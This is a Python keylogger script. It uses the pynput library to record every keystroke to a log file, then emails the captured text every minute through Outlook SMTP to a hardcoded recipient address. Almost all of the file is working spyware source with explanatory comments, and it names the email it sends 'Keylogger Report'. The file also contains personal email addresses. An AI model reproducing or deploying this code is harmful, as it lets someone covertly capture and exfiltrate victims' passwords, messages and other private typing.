import smtplib # Simple Mail Transfer Protocol (SMTP) is a protocol, which handles sending e-mail and routing e-mail between mail servers.
import threading # The threading module allows you to create different threads for your program.
from pynput.keyboard import Key, Listener # The pynput module allows you to control and monitor input devices.
# Keyboard is a subpackage of pynput used to control and monitor the keyboard. 
# Listener is a class used to monitor the keyboard.
# Key is a class used to represent keys on the keyboard.

keys = [] # List to store the keys pressed by the user
interval = 60  # Interval in seconds (1 minute) for sending email
to_email = "abhishek737333@gmail.com"  # Replace with recipient's email address

log_file = 'log.txt' # File to store the logged keys

# Function to log the keys
def on_press(key): # When a key is pressed
    keys.append(key) # Append the key to the keys list
    try: # Try to convert the key to a string
        print('alphanumeric key {0} pressed'.format(key.char)) # Print the alphanumeric key pressed
    except AttributeError: # If the key is not a string
        print('special key {0} pressed'.format(key)) # Print the special key pressed

# Function to write the keys to a file
def write_file(keys): # Write the keys to a file
    with open(log_file, 'a') as f: # Open the file in append mode
        for key in keys: # Iterate over the keys
            k = str(key).replace("'", "") # Replace the single quotes from the key with an empty string
            f.write(k) # Write the key to the file
            # explicitly adding a space after every keystroke for readability
            f.write(' ')

# Function to send the email
def send_email(email, password): 
    global keys
    if keys:
        try:
            server = smtplib.SMTP("smtp-mail.outlook.com", 587) # SMTP server and port
            server.starttls() # Start TLS encryption
            server.login(email, password) # Login to the email server
            
            # Convert KeyCode objects to their string representations
            subject = "Keylogger Report"
            write_file(keys) # Write the keys to a file
            body = "" # Body of the email
            for key in keys: # Iterate over the keys
                if hasattr(key, 'char'): # If the key has a character attribute
                    body += key.char # Add the character to the body
                elif key == Key.space: # If the key is a space
                    body += ' ' # Add a space to the body
                elif key == Key.enter: # If the key is an enter key
                    body += '\n' # Add a new line to the body
                elif key == Key.backspace: # If the key is a backspace key
                    body = body[:-1] # Remove the last character from the body
                    
            message = f"Subject: {subject}\n\n{body}" # Construct the email message
            server.sendmail(email, to_email, message) # Send the email
            server.quit() # Quit the email server
            keys.clear()  # Clear keys after sending email
            print("Email sent successfully") # Print a success message
            start_timer() # Start the timer again
        except Exception as e:
            print(f"Error sending email: {e}")

# Function to start the timer
def start_timer(): # Start the timer
    threading.Timer(interval, send_email, args=(email, password)).start() # Start the timer again   

# Function to stop the keylogger
def on_release(key): # When a key is released
    print('{0} released'.format(key)) # Print the released key
    if key == Key.esc: # If the Esc key is pressed
        # Stop listener
        return False

# Main function
if __name__ == "__main__":
    email = "err_abhishek@outlook.com"  # Replace with your email address
    password = "Password"  # Replace with your email password
    
    # Start listener
    with Listener(on_press=on_press,on_release=on_release) as listener: # Create an instance of Listener
        start_timer() # Start the timer
        listener.join() # Join the thread to the main thread
